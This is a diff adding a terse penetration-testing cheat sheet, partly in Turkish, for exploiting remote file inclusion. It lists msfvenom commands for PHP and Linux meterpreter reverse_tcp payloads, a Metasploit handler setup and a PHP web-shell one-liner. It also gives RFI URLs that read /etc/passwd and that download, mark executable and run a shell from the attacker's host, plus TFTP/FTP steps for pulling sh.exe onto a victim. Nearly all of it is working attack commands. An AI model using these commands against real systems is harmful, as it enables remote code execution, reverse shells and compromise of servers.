@@ -1,0 +1,48 @@
+msfvenom -p php/meterpreter/reverse_tcp LHOST=$your_ip LPORT=4444 -e php/base64 -f raw > payload.txt
+
+# set http server python -m SimpleHTTPServer 80
+
+user exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST $your_ip
+set LPORT 6666
+set ExitOnSession false
+exploit -j -z
+
+TRIGGER THE RFI:
+	?page=http://YOURIP/PAYLOAD.TXT
+
+RFI cmd.php elf payload;
+
+	echo "<?php System($_GET['cmd']);?>" > payload.txt [ur payload]
+python -m SimpleHTTPServer 80 [deploy a HTTP Server]
+?cmd=cat%20/etc/passwd&page=http://$ur_ip/payload.txt [Execution of PLOAD]
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ur_ip LPORT=4444 -f elf > shell.elf [meterpreter payload'u]
+
+?cmd=wget http://$your_ip/shell.elf /var/tmp/shell.elf&page=http://ur__ip/payload.txt
+?cmd=chmod %2bx /var/tmp/shell.elf&page=http://ur_ip/payload.txt
+>TCP 4444 portundan dinleyecek linux/x86/meterpreter/reverse_tcp start multi
+?cmd=/var/tmp/shell.elf&page=http://$UR_IP/payload.txt
+
+
+--------------------------------------------------------------------
+
+TFTP service:
+	use auxiliary/server/tftp 
+	set tftproot /root/DIR
+	exploit
+	
+	On Victim side:
+	tftp -i $YOUR_ADDRESS get sh.exe
+FTP Service:
+	use auxiliary/server/ftp
+	set ftproot /root/
+	exploit
+	
+	On Victim Side:
+	open $YOUR_aDDRESs
+	anonymous
+	whatever
+	binary
+	get sh.exe C:\\WINDOWS\\TEMP\\sh.exe
+	ftp -s:C:\\WINDOWS\TEMP\\ftp.txt
